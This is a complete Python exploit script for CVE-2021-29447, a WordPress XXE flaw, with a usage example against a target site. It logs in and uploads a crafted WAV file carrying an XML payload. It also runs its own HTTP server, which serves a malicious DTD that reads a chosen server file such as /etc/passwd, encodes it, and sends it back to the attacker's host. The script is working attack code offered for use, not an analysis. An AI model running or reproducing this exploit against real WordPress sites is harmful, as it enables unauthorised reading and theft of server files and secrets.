from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import argparse
import io
import sys
import requests
import re
import json
import html
import base64
import zlib
import threading

def create_xxe_handler(lhost, lport, file, shutdown_callback):
    class XXEHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            parsed = urlparse(self.path)

            # Response with malicious DTD
            if parsed.path == "/xxe.dtd":
                self.send_response(200)
                self.send_header("Content-Type", "application/xml")
                self.end_headers()
                dtd = (
                    f"<!ENTITY % file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource={file}\">"
                    f"<!ENTITY % init \"<!ENTITY &#x25; trick SYSTEM 'http://{lhost}:{lport}/?f=%file;'>\" >"
                )
                self.wfile.write(dtd.encode("utf-8"))

            # Decompress, decode and log exfiltrated file
            elif parsed.query.startswith("f="):
                exfiltrated_file = parsed.query.split("=", 1)[1]
                try:
                    decoded = base64.b64decode(exfiltrated_file)
                    decompressed = zlib.decompress(decoded, -15).decode()
                    print(decompressed)
                except Exception as e:
                    print(f"[!] Error decoding: {e}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")
                threading.Thread(target=shutdown_callback).start()

        def log_message(self, format, *args):
            # Disable logs
            pass

    return XXEHandler

class XXEServer(threading.Thread):
    def __init__(self, lhost, lport, file, shutdown_event):
        super().__init__(daemon=True)
        self.__shutdown_event = shutdown_event
        self.__server = HTTPServer((lhost, lport), create_xxe_handler(lhost, lport, file, self.stop))

    def run(self):
        self.__server.serve_forever()

    def stop(self):
        self.__shutdown_event.set()
        self.__server.shutdown()
        self.__server.server_close()

class WordPressClient:
    def __init__(self, url, username, password):
        self.__url = url
        self.__username = username
        self.__password = password
        self.__session = requests.Session()
        self.__login()

    def upload_media(self, media_file_name, media_file_content, media_file_type):
        data = self.__get_uploader_multipart_parameters()
        data["name"] = media_file_name
        files = {
            "async-upload": (media_file_name, media_file_content, media_file_type)
        }
        self.__session.post(f"{self.__url}/wp-admin/async-upload.php", data=data, files=files)

    def __login(self):
        login_request = {
            "log": self.__username,
            "pwd": self.__password,
            "wp-submit": "Log+In"
        }
        response = self.__session.post(f"{self.__url}/wp-login.php", data=login_request)
        if "login_error" in response.text:
            raise Exception("Invalid username or password")
        return self

    def __get_uploader_multipart_parameters(self):
        response = self.__session.get(f"{self.__url}/wp-admin/media-new.php")
        soup = BeautifulSoup(response.text, features="html.parser")
        script_tags = soup.find_all("script", type="text/javascript")
        for script_tag in script_tags:
            if "wpUploaderInit" in script_tag.text:
                match = re.search(r'wpUploaderInit\s*=\s*(\{.*?});', script_tag.string, re.DOTALL)
                if match:
                    json_str = html.unescape(match.group(1))
                    wp_uploader_init = json.loads(json_str)
                    if "multipart_params" in wp_uploader_init:
                        return wp_uploader_init["multipart_params"]
        raise Exception("Unable to find uploader multipart parameters")

def parse_args():
    parser = argparse.ArgumentParser(
        prog="python3 ./CVE-2021-29447.py",
        epilog="Example:\npython3 ./CVE-2021-29447.py --lhost 10.10.14.157 --lport 8080 --target http://target.com --user user --password pass --file /etc/passwd",
        add_help=False
    )
    parser.add_argument("--lhost", help="IP address where the HTTP server will listen, must be reachable by the target")
    parser.add_argument("--lport", help="Local port for the HTTP server to bind to")
    parser.add_argument("--target", help="Full URL of the WordPress target")
    parser.add_argument("--user", help="Username used to authenticate with the WordPress site")
    parser.add_argument("--password", help="Password for the specified WordPress user")
    parser.add_argument("--file", help="Absolute path of the file to attempt exfiltration from the target system")
    parser.add_argument("--timeout", help="Maximum number of seconds to wait for the exfiltration callback before shutting down the server", default=2)
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    return parser.parse_args()

def prepare_payload(lhost, lport):
    payload = (
        f"RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00"
        f"<?xml version=\"1.0\"?>"
        f"<!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://{lhost}:{lport}/xxe.dtd'>%remote;%init;%trick;]>\x00"
    )
    return io.BytesIO(payload.encode("latin-1"))

def main():
    args = parse_args()
    # Start HTTP server to exfiltrate file.
    shutdown_event = threading.Event()
    server = XXEServer(args.lhost, int(args.lport), args.file, shutdown_event)
    server.start()
    # Connect to target and upload malicious payload.
    client = WordPressClient(args.target, args.user, args.password)
    client.upload_media("payload.wav", prepare_payload(args.lhost, args.lport), "audio/vnd.wave")
    # Wait up to 'timeout' seconds for connection from target.
    if not shutdown_event.wait(timeout=args.timeout):
        print("[!] Timeout reached while waiting for a response.")
        server.stop()
    server.join()

if __name__ == "__main__":
    main()